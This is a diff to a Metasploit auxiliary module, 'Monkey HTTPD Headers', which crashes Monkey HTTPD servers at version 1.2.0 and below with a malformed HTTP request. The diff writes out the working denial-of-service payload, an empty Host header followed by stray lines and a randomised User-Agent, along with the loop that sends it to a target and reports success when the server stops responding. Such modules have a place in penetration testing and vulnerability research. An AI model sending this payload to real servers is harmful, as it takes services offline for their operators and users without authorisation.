@@ -16,9 +16,9 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Monkey HTTPD Headers',
 			'Description'    => %q{
-				Improper header parsing leads to a segmentation
-				fault when a specially crafted request is sent to
-				the server.  Affects version <= 1.2.0.
+					Improper header parsing leads to a segmentation fault when a
+				specially crafted request is sent to the server.
+				Affects version <= 1.2.0.
 			},
 			'Author'         =>
 				[
@@ -38,27 +38,18 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		req = "GET / HTTP/1.1\r\n"
+		req << "Host:\r\n\r\nlocalhost\r\n"
+		req << "User-Agent:#{Rex::Text.rand_text_alpha(3)}\r\n\r\n"
 		2.times do
 			begin
 				connect
 				print_status("Sending DoS packet to #{rhost}:#{rport}")
-				sock.put("GET / HTTP/1.1\r\nHost:\r\n\r\nlocalhost\r\nUser-Agent:foo\r\n\r\n")
+				sock.put(req)
 				disconnect
-				sleep 1
+				Rex.sleep 1
 			rescue ::Rex::ConnectionRefused
-				print_good("Unable to connect to #{rhost}:#{rport}.")
-				break
-			rescue ::Errno::ECONNRESET
-				print_good("DoS packet successful. #{rhost} not responding.")
-				break
-			rescue ::Rex::HostUnreachable
-				print_good("Couldn't connect to #{rhost}:#{rport}.")
-				break
-			rescue ::Timeout::Error, ::Errno::EPIPE
-				print_good("Timeout error connecting to #{rhost}:#{rport}.")
-				break
-			rescue ::Rex::ConnectionTimeout
-				print_good("Monkey server is down!")
+				print_good("Connection Refused: Success!")
 				break
 			ensure
 				disconnect
